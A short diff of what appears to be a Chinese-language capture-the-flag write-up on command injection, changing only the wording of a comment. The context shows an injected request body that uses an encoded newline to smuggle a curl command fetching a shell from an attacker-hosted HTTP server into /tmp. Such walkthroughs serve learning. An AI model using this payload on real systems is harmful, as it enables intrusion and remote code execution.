@@ -50,7 +50,7 @@ $ python3 -m http.server 83
 ```
 password=xiaohei%0acurl%09http://10.10.14.87:83/shell%09-o%09/tmp/shell&backup=
 ```
-#### xiaohei为随意设置的密码，%09为\t空格，%0a为\n
+#### xiaohei是自个设置的密码，%09为\t空格，%0a为\n
 ![hhh没有这么破裂的快乐过](images/082107.png)
 #### Forword后，在浏览器页面会显示：
 ![hhh没有这么破裂的快乐过](images/082108.png)
